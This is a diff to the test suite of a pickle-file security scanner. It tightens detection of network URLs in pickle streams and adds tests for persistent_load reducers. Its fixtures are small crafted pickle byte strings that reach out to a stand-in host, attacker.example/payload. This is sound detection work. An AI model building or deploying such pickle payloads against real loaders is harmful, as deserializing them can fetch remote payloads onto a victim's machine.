@@ -1779,12 +1779,17 @@ def test_scan_stream_fails_closed_for_truncated_first_stream_url_literal() -> No
     )
 
 
-def test_scan_stream_allows_inert_url_literal_before_unknown_opcode() -> None:
+def test_scan_stream_fails_closed_for_url_literal_before_unknown_opcode() -> None:
     payload = b"Vhttps://docs.example.invalid/reference/requests.get(url)\nz"
 
     result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="malformed-url-metadata.pkl")
 
-    assert not any(issue.rule_code == "S310" and issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+    assert any(
+        issue.rule_code in {"S302", "S310"}
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        for issue in result.issues
+    )
 
 
 def test_scan_stream_allows_inert_url_literal_in_concatenated_stream_without_critical_network() -> None:
@@ -2020,6 +2025,25 @@ def test_scan_stream_keeps_requests_url_reducer_actionable() -> None:
         and issue.details.get("matched_text") == "https://attacker.example/payload"
     ]
     assert len(explicit_url_issues) == 1
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        b"Vloader\nQ(Vhttps://attacker.example/payload\ntR.",
+        b"Ploader\n(Vhttps://attacker.example/payload\ntR.",
+    ],
+)
+def test_scan_stream_keeps_persistent_load_result_url_reducer_actionable(payload: bytes) -> None:
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="persistent-url-reducer.pkl")
+
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+        for issue in result.issues
+    )
 
 
 def test_root_raw_detectors_deduplicate_offset_network_url_reducer() -> None:
